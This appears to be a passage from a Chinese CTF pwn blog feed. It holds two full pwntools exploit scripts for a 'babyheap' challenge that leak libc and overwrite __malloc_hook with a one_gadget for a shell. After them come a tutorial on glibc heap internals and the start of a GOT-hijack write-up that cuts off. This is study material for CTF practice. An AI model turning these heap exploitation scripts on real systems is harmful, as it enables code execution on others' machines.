class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26165</span><span class="token punctuation">)</span><span class="token comment">#io=process('./babyheap')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level='debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allocate</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h2><hr><p>这种方法由学长提供，对<strong>堆块重叠</strong>了解不是很深的看这篇<a href="https://oneda1sy.gitee.io/2021/11/16/Heap-Overlapping/#:~:text=%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E5%B0%B1%E6%98%AF%E6%89%A9%E5%B1%95,%E9%87%8D%E5%8F%A0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%85%B3%E7%B3%BB%E3%80%82">文章</a><br>这里用的是向后合并的方法</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><hr><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28791</span><span class="token punctuation">)</span><span class="token comment">#io=process('./babyheap')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk0 这个堆块可以改变大小</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk1 经测试，这个堆块要大于等于后面0x100的堆块大小</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk2 申请大于fastbin范围的堆块用于泄露libc地址指向main_arena+88的位置</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#chunk3 防止topchunk合并，0x60后面申请fake_chunk有用</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment">#按照向前合并要求将chunk1释放</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span> <span class="token comment">#修改chunk1的size大小为0x220</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment">#在chunk0填入</span>add<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span> <span class="token comment">#将chunk1申请回来，此时chunk2和chunk1的部分堆块重叠  </span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token comment">#用于calloc会将申请得到的堆块chunk1清零，chunk2的size会丢失，将其补上</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#泄露libc地址</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#因为chunk2在chunk1范围，打印chunk1会顺带把chunk2的内容打印出来</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span> libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment">#把chunk2补上</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#chunk4</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#free chunk4使用doublefree获取fake_chunk</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#获得fakechunk</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span> <span class="token comment">#覆盖mallok_hook为one_gadget</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#再次调用执行malloc_hook </span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux动态内存管理</title>
      <link href="/2023/01/16/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2023/01/16/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="linux动态内存管理（堆基础）"><a href="#linux动态内存管理（堆基础）" class="headerlink" title="linux动态内存管理（堆基础）"></a>linux动态内存管理（堆基础）</h1><p>终于到了堆，这里是学pwn的分水岭，是新人杀手，每一届都会有很多人在这被劝退改方向，因为堆确实很玄学。</p><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>我们之前学过，栈上存储的是一个函数的局部变量，bss存储全局变量。如果用户向程序输入一个几千字的留言怎么办，开一个二维大数组？首先长度会有限制如果开的<br>数组字节过长那么对于程序而言就会造成空间浪费，如果想要回收这段没用的空间要如何呢？在libc中，我们可以通过malloc(size)来给用户分配一段长度为size的<br>内存，通过free(ptr)来释放这段内存区域。这些数据，被统一的存放在了堆中，维护这些数据的运行机制在glibc中，称之为ptmalloc。</p><h2 id="0x01-堆题与栈题的区别"><a href="#0x01-堆题与栈题的区别" class="headerlink" title="0x01 堆题与栈题的区别"></a>0x01 堆题与栈题的区别</h2><ul><li>1、堆的漏洞比栈有更多的形式和利用方式，堆漏洞所需要的条件比栈更少。</li><li>2、一般情况下栈溢出起码需要16个字节，也就是至少溢出到返回地址才能利用，<strong>但是堆的话只需要一个字节就可完成利用</strong>。栈的话基本都会关闭一两个保护机制，<strong>堆的话一般全开</strong>。</li></ul><h2 id="0x02-堆的结构"><a href="#0x02-堆的结构" class="headerlink" title="0x02 堆的结构"></a>0x02 堆的结构</h2><p>在内存中，堆是以一个个堆块构成的，这些堆块称之为chunk。在64位系统中，堆块的大小是8字节对齐的，我们申请一个15字节长度的堆块，实际到我们手中的用户可<br>控的数据区域大小为16字节。<strong>但是实际可以说是16字节对齐，假设申请了0x58个字节的chunk，实际到手的却是是0x60的大小</strong><br>一个堆块除了用户数据区外，还有头部字段，头部字段的长度为16字节。同时在64位系统中，一个堆块最小长度为32字节（包括头部），也就是说，<strong>我们分配一个1字节<br>的堆块，他的实际长度是32字节（0x20）。（最小的chunk）</strong><br>下面是chunk的图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/1.png"><br>prev_size 和size字段分别代表前一个chunk的大小以及当前chunk的大小，大小都是8字节，两个一共16字节，称之为chunk的头部字段。后面的user data区域是<br>用户可以输入数据的地方。为了节省空间，将size的最低三个bit设置为三个标志位，<strong>从高到低分别为non_main_arena、is_mmap、prev_inuse 。</strong></p><ul><li>non_main_arena用来记录当前chunk是否不属于主线程，1表示不属于，0表示属于。</li><li>is_mmap表示当前chunk是否由mmap分配的，1表示属于，0表示不属于。</li><li>prev_inuse用来表示前面紧邻的那个chunk是否正在使用，0表示前面的chunk已经被释放，1表示正在被用户使用</li><li>prev_size 和size字段分别代表前一个chunk的大小以及当前chunk的大小，大小都是8字节</li></ul><p>这里注意prevsize记录前面一个chunk的大小。这里注意，prevsize只有在前面的chunk被free掉的时候才生效，也就是说，只有在prev_inuse为0的时候，系统才<br>把prev_size字段当作prevsize。<strong>如果chunk正在被使用，那么他会把下一个chunk的prevsize字段当作userdata。充分利用空间。</strong>例如也就是说，如果我们申<br>请一个0x80长度大小的区域，系统实际给我们0x90大小（0x10头部），<strong>如果我们申请0x88大小的区域，系统同样也会给我们0x90大小的区域（算头部），剩下的8字节，<br>使用nextchunk的prevsize区域。</strong>因为，只有当一个chunk被释放的时候，nextchunk的prevsize才真正代表前一个chunk的大小</p><h2 id="0x03-特殊的堆块：topchunk"><a href="#0x03-特殊的堆块：topchunk" class="headerlink" title="0x03 特殊的堆块：topchunk"></a>0x03 特殊的堆块：topchunk</h2><p>最开始时，程序的堆还未被使用，整个的堆区域属于一个很大的堆块叫做topchunk。当已经被使用的空间不够时，程序就会从topchunk中分割一块出来个程序使用。</p><h2 id="0x04-堆块的管理"><a href="#0x04-堆块的管理" class="headerlink" title="0x04 堆块的管理"></a>0x04 堆块的管理</h2><h3 id="0x04-1-bin的类型"><a href="#0x04-1-bin的类型" class="headerlink" title="0x04(1) bin的类型"></a>0x04(1) bin的类型</h3><p>bins的类型图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/6.png"><br>为了保证程序的快速运行，而且方便系统内存管理，所以ptmalloc将释放后的堆块根据其大小分成不同的bin。</p><ul><li>fastbin：大小范围：0x20 - 0x80</li><li>smallbin:大小范围：0x90 - 0x400</li><li>Large bin:大小范围：0x410 以上</li><li>unsortedbin ：未被归类的bin，临时存储用，存放的堆块大小不一定多大</li></ul><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/7.png"></p><ul><li>1、管理fastbin free chunk，单链表结构，FILO（最后一个进入fastbin链表的，会被放在头部）。</li><li>2、总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增</li><li>3、大小属于fastbin的chunk被free掉时，<strong>不会改变nextchunk的previnuse位，也就是说不会被合并</strong>。</li></ul><h4 id="Unsortedbin"><a href="#Unsortedbin" class="headerlink" title="Unsortedbin"></a>Unsortedbin</h4><p><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/8.png"></p><ul><li>1、管理 unsorted chunk，只有一个双向链表</li><li>2、所有大小大于fastbin的chunk都会先被暂时放入unsortedbin中,链表中的chunk大小不一</li></ul><h4 id="Smallbin"><a href="#Smallbin" class="headerlink" title="Smallbin"></a>Smallbin</h4><ul><li>1、管理small chunk，由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增。（长得和unsortedbin差不多偷个懒就不画图了.）</li></ul><h4 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h4><ul><li>1、管理large chunk，63个双向链表，FIFO先进先出。</li><li>2、同一个双线链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列。</li></ul><h3 id="0x04-2-chunk-free后的内容"><a href="#0x04-2-chunk-free后的内容" class="headerlink" title="0x04(2) chunk free后的内容"></a>0x04(2) chunk free后的内容</h3><p>chunk被free之后的样子如图。<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/2.png"><br>由于chunk被free了，所以按常理说用户不应该能够访问到这个chunk。于是乎在userdata区域存放一些用于管理内存的指针信息。</p><h3 id="0x04-3-bin中的指针类型"><a href="#0x04-3-bin中的指针类型" class="headerlink" title="0x04(3) bin中的指针类型"></a>0x04(3) bin中的指针类型</h3><p>如上图参考位置：</p><ul><li>fastbin：单链表结构，只有fd</li><li>small &amp;unsortedbin：双向链表结构，fd和bk都有</li><li>largebin：双向链表，fdbk都有，同时还有fd nextsize 和 bk nextsize</li></ul><h2 id="0x05-堆块的合并操作"><a href="#0x05-堆块的合并操作" class="headerlink" title="0x05 堆块的合并操作"></a>0x05 堆块的合并操作</h2><p>如果我们free掉一个堆块，<strong>（可能）</strong>会<strong>触发</strong>向前合并和向后合并。（两个相邻的都为0则合并，朝已经是0的方向合并）<br>向前合并：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/3.png"></p><ul><li>检查当前chunk的previnuse位，如果为0，则根据当前chunk的prev size找到prev chunk的头，两个堆块合并<br>向后合并：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/4.png"></li><li>检查当前chunk的next chunk 的prev inuse位（因为一个堆块的状态由他后面chunk的previnuse位决定，所以确定nextchunk的状态需要检查next next chunk的previnuse位，怎么找？size就行），然后根据nextchunk的状态决定是否合并。</li></ul><h2 id="0x06-arena"><a href="#0x06-arena" class="headerlink" title="0x06 arena"></a>0x06 arena</h2><p>arena是一块结构体，用于管理bins。主线程创建的arena称之为main_arena,其他的叫threadarena<br>如图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/5.png"></p><h2 id="malloc调用机制"><a href="#malloc调用机制" class="headerlink" title="malloc调用机制"></a>malloc调用机制</h2><p>在fastbin范围内：检查对应的bin链表中有没有chunk，</p><ul><li>有，分配给用户，完成</li></ul><p>在smallbin范围内：检查对应大小的bin链表中有没有chunk，</p><ul><li>有，取出来给程序，完成。</li></ul><p>如果不在smallbin范围内，或者smallbin里面也没有：unsortedbin中：有的话，从尾部取出第一个chunk，看看大小是否满足需求。<br>满足，切分后大小是否大于minsize？</p><ul><li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li><li>小于等于minsize，直接返回给用户，完成</li><li>不满足，把这个块放入small&#x2F;largebin对应的链表中，继续遍历下一个块。</li></ul><p>如果unsortedbin中所有的块也不能满足需求：<br>largebin范围：检查对应的bin链表中有没有符合的chunk。</p><ul><li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中。</li></ul><p>largebin也不行？再次遍历small&#x2F;large找best fit的chunk</p><ul><li>还是没有，那就从topchunk中切割</li></ul><p>topchunk也不够？</p><ul><li>mmap系统调用。</li></ul><h2 id="free调用机制："><a href="#free调用机制：" class="headerlink" title="free调用机制："></a>free调用机制：</h2><p>free的chunk大小属于fastbin吗？</p><ul><li>是，放进fastbin，完成。</li></ul><p>是mmap分配的吗？</p><ul><li>是，调用munmap回收，完成</li></ul><p>前一个chunk空闲吗？</p><ul><li>是，向前合并。</li></ul><p>后一个chunk是free的吗？</p><ul><li>是，向后合并。放进unsortedbin，完成。</li></ul><p>后一个chunk是topchunk吗？</p><ul><li>是，和topchunk合并，完成。</li></ul><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>想要做出ctf的堆题，必须要对堆的管理机制了如指掌，需要大量刷题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>got表劫持实战讲解</title>
      <link href="/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Recho"><a href="#攻防世界Recho" class="headerlink" title="攻防世界Recho"></a>攻防世界Recho</h1><p>对于这题有两个知识点要讲1、got表劫持2、pwntools的shutdown用法场景<br>先checksec一下：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/1.png"><br>开了NX保护机制看起来还行，但作为进阶pwn应该不会太简单。<br>拖进IDA查看：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/2.png"><br>代码不会花里胡哨，没有调用杂七杂八的函数，同样没有后门函数。<br>这里溢出点非常简单，只要读入nptr，**v7 &#x3D; atoi(nptr)**会自动将读入的nptr进行整型转换，atoi函数自行去网上搜，这里不作过多赘述。<br><strong>v6 &#x3D; read(0, buf, v7)</strong>;只要v7足够大，那么buf就可以无限读入实现溢出。但难点在于如何结束循环，因为不管怎样read只要有读入返回值就一定不会是0。</p><h2 id="0x01-pwntools-shutdown方法"><a href="#0x01-pwntools-shutdown方法" class="headerlink" title="0x01 pwntools shutdown方法"></a>0x01 pwntools shutdown方法</h2><p>如果是在linux终端上直接运行，我们可以用Ctrl+D，然而，pwn远程，就无法处理这种信号。幸运的是pwntools提供了一个shutdown功能，<strong>该功能可以关闭流，如果我们关闭输入流,这个循环就结束了。但是我们别想再次ROP到主函数获取输入，因为关闭后就不能打开，除非重新运行</strong>，那么之前的工作不都白费了吗。因此，我们必须一次性完成所有操作。<br>一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system也可以用系统调用,而对于有些系统则不行，因此，我们这里<strong>不再get shell，我们直接读取flag，然后打印出来</strong>。<del>这样rop链会非常的长……</del></p><h2 id="0x02-got表劫持"><a 